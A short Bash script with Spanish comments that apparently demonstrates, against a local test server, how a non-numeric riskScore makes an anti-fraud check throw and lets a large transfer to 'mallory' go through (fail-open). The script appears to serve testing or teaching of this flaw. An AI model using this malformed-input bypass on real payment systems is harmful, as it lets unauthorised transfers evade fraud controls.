#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"; PORT="${PORT:-8103}"
echo "== Ataque: forzar que el chequeo antifraude lance una excepcion (riskScore no numerico) =="
echo "Transferencia de 50000 (normalmente DENEGADA por monto) con riskScore=abc:"
RESP=$(curl -s -X POST "http://127.0.0.1:${PORT}/transfer" --data-urlencode "from=alice" --data-urlencode "to=mallory" --data-urlencode "amount=50000" --data-urlencode "riskScore=abc")
echo "$RESP"
if echo "$RESP" | grep -Eq '"executed": ?true'; then echo "Resultado: la transferencia SE EJECUTO pese a que el chequeo fallo (fail-open)."; else echo "Resultado: la transferencia NO se ejecuto (fail-closed)."; fi
